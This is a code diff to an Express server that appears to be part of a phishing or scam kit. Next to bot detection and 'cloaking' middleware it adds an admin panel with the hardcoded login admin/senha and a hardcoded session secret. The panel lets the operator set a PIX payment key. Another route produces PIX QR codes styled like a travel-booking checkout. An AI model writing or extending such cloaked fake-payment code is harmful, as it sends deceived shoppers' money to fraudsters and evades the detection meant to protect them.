@@ -5,6 +5,8 @@ const cors = require("cors");
 const helmet = require("helmet");
 const path = require("path");
 const axios = require("axios");
+const session = require('express-session');
+const bodyParser = require('body-parser');
 
 const { isBot } = require("./utils/botDetection");
 const Domain = require("./models/Domain");
@@ -68,6 +70,81 @@ app.get("/api/airport", async (req, res) => {
     res.status(500).json({ error: "something went wrong", detail: err.message });
   }
 });
+
+
+app.use(session({
+  secret: 'glitchInfernal666',
+  resave: false,
+  saveUninitialized: true
+}));
+
+// Parse POST body
+app.use(bodyParser.urlencoded({ extended: true }));
+app.use(bodyParser.json());
+
+// Serve arquivos estáticos do admin (caso tenha CSS ou JS lá)
+app.use('/admin/static', express.static(path.join(__dirname, 'public', 'black', 'admin', 'views', 'login.html')));
+
+// Middleware de autenticação
+function checkAuth(req, res, next) {
+  if (req.session && req.session.auth) return next();
+  return res.redirect('/admin/login');
+}
+
+// Rotas do painel
+app.get('/admin/login', (req, res) => {
+  res.sendFile(path.join(__dirname, 'public', 'black', 'admin', 'views', 'login.html'));
+});
+
+app.post('/admin/login', (req, res) => {
+  const { user, pass } = req.body;
+  if (user === 'admin' && pass === 'senha') {
+    req.session.auth = true;
+    return res.json({ success: true });
+  }
+  return res.json({ error: true });
+});
+
+app.get('/admin/logout', (req, res) => {
+  req.session.destroy(() => res.redirect('/admin/login'));
+});
+
+app.get('/admin/dashboard', checkAuth, (req, res) => {
+  res.sendFile(path.join(__dirname, 'public', 'black', 'admin', 'views', 'login.html'));
+});
+
+app.get('/admin/get-pix', checkAuth, (req, res) => {
+  const credPath = path.join(__dirname, 'admin', 'cred', 'pix.json');
+  if (!fs.existsSync(credPath)) return res.json({ pix: '' });
+  const data = JSON.parse(fs.readFileSync(credPath));
+  return res.json({ pix: data.pix || '' });
+});
+
+app.post('/admin/save-pix', checkAuth, (req, res) => {
+  const credPath = path.join(__dirname, 'admin', 'cred', 'pix.json');
+  const pix = req.body.pix?.trim() || '';
+  fs.writeFileSync(credPath, JSON.stringify({ pix }, null, 2));
+  return res.json({ success: true });
+});
+
+
+app.post('/pix/payment/generate', (req, res) => {
+  const price = parseFloat(req.body.price.replace(",", "."));
+
+  const code = Pix.get_code(price);
+  const qrCode = Pix.get_qrcode(code);
+
+  const html = `
+    <img class="pix-confirmation-box__qrcode" src="${qrCode}">
+    <div class="content-for-pix-code">${code}</div>
+    <a data-code="${code}" id="btn-copy" class="eva-3-btn -lg -primary">
+      <em class="btn-text">Copiar código</em>
+    </a>
+  `;
+
+  res.send(html);
+});
+
 
 
 // 🎭 Middleware final de cloaking renderizando HTML local
